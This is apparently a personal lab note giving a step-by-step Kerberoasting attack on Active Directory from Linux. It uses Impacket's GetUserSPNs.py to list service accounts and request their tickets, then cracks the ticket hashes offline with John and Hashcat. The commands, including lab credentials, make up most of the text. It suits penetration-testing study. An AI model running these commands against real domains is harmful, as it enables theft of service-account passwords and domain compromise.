
**Kerberoasting targets service accounts that have an SPN (a service identifier).**
- When a user asks to access a service, they receive a **Service Ticket (ST)**
- This ticket is **encrypted using the service account’s password**

 If an attacker gets this ticket:
- They can take it offline
- Try to **crack it to find the service account password**

> Kerberoasting requires valid domain user credentials to request a service ticket.

---
#  What do you need before running Kerberoasting?

-  You must have **valid domain user credentials**  
-  You must be **able to query the domain controller**  
-  You want to **find accounts that have SPNs set** (meaning they're running services
#  Step-by-Step Attack From Linux (Using Impacket)

# 1.  Install Impacket

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```
# 2.  List SPNs (Service Accounts)

Check kerberoastable users using the Impacket's module GetUserSPNs.py
```bash
# Lists all accounts with SPNs (service accounts)
GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc
# Same command structure for any domain/user
GetUserSPNs.py <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <DC_IP>
```

It will searches for **accounts that have SPNs (service accounts)**
 ![[Pasted image 20260415143235.png]]
in this case there're two vulnerable users: 'kerberoasting' and 'angel'.

> **Check if any are Domain Admins!** Those are jackpot targets.

# 3.  **Request All TGS Ticket**

```bash

# **Request All TGS Tickets (for all SPNs)**
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request

# Request Ticket for a Specific Account (Optiona)
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_ACCOUNT>

#example
GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request #without specifing a user it checks all possible tickets
GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt
```

![[Pasted image 20260415150325.png]]

# 4.  **Crack the TGS Ticket (Offline)**

```bash
# Cracks with John the Ripper
john --wordlist=/home/kali/Documents/password.txt ./kerberoast.txt
# Cracks with Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 ./kerberoast.txt /home/kali/Documents/password.txt
# Alternative mode for RC4 encrypted tickets
hashcat -m 13100 --force kerberoast.txt rockyou.txt
```
![[Pasted image 20260415150436.png]]


# Troubleshooting: Clock Skew Errors
If you encounter `KRB_AP_ERR_SKEW (Clock skew too great)`, synchronize the clocks with:

```bash
# Disables automatic time sync
sudo timedatectl set-ntp off
# Checks time difference with DC
ntpdate -q corp-dc
# Forces time sync with DC
ntpdate -u corp-dc
```